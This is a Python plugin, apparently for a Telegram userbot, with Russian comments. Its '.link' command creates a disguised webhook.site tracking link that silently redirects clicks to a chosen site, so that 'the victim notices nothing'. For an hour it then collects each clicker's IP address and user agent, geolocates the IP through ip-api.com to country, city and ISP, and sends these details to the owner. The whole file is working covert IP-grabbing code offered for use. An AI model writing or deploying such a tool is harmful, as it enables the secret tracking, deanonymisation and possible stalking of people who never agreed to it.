import aiohttp
import asyncio

async def handle_cmd(event, client, owner_id, cmd, args, txt):
    if cmd == '.link':
        if len(args) < 2:
            return await event.edit("⚠️ Укажите целевую ссылку:\nПример: `.link https://google.com`")

        target_url = args[1]
        # Защита от дурака, если забыли http
        if not target_url.startswith("http"):
            target_url = "https://" + target_url

        await event.edit("⏳ Генерирую ссылку-ловушку...")

        try:
            async with aiohttp.ClientSession() as session:
                # 1. Создаем уникальный токен-ловушку
                async with session.post("https://webhook.site/token") as resp:
                    if resp.status not in [200, 201]:
                        return await event.edit("❌ Ошибка сервера логгера. Попробуйте позже.")
                    data = await resp.json()
                    uuid = data['uuid']

                # 2. Настраиваем моментальный редирект (чтобы жертва ничего не поняла)
                html_redirect = f"""
                <!DOCTYPE html><html><head>
                <meta http-equiv="refresh" content="0; url={target_url}">
                <script>window.location.replace("{target_url}");</script>
                </head><body>Redirecting...</body></html>
                """
                
                put_data = {
                    "default_content": html_redirect,
                    "default_content_type": "text/html",
                    "default_status": 200
                }
                
                # Записываем настройки в ловушку
                await session.put(f"https://webhook.site/token/{uuid}", json=put_data)

                tracking_link = f"https://webhook.site/{uuid}"
                
                await event.edit(
                    f"🔗 **Ссылка-ловушка готова!**\n\n"
                    f"Отправьте её жертве:\n`{tracking_link}`\n\n"
                    f"*(При клике её перекинет на {target_url})*\n\n"
                    f"📡 *Фоновая слежка запущена (работает 1 час)...*"
                )

                # 3. Запускаем фоновую задачу для отслеживания кликов
                asyncio.create_task(poll_logger(client, event.chat_id, uuid))

        except Exception as e:
            await event.edit(f"❌ Ошибка генерации: {e}")

# ФОНОВЫЙ ПРОЦЕСС: Проверяет логи
async def poll_logger(client, chat_id, uuid):
    seen_requests = set()
    api_url = f"https://webhook.site/token/{uuid}/requests?sorting=newest"
    
    # Бот проверяет клики каждые 5 секунд в течение 1 часа (720 раз)
    for _ in range(720):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        requests = data.get('data', [])
                        
                        for req in requests:
                            req_id = req['uuid']
                            if req_id not in seen_requests:
                                seen_requests.add(req_id)
                                
                                ip = req.get('ip', 'Unknown')
                                ua = req.get('user_agent', 'Unknown')
                                
                                # ИГНОРИРУЕМ БОТОВ ТЕЛЕГРАМА (превью ссылок)
                                ua_lower = ua.lower()
                                if "bot" in ua_lower or "telegram" in ua_lower or "whatsapp" in ua_lower:
                                    continue
                                    
                                # 4. Вычисляем Геолокацию жертвы по IP
                                geo_info = "Не удалось определить"
                                async with session.get(f"http://ip-api.com/json/{ip}?lang=ru") as geo_resp:
                                    if geo_resp.status == 200:
                                        g = await geo_resp.json()
                                        if g.get('status') == 'success':
                                            geo_info = f"🏳️ Страна: {g.get('country')}\n🏙 Город: {g.get('city')}\n📡 Провайдер: {g.get('isp')}"

                                # 5. Отправляем алерт хозяину
                                alert = (
                                    f"🚨 **КТО-ТО ПЕРЕШЕЛ ПО ВАШЕЙ ССЫЛКЕ!**\n\n"
                                    f"🌐 **IP Адрес:** `{ip}`\n"
                                    f"📍 **Геолокация:**\n{geo_info}\n\n"
                                    f"📱 **Устройство / Браузер:**\n`{ua}`"
                                )
                                await client.send_message(chat_id, alert)
        except Exception:
            pass
        
        await asyncio.sleep(5)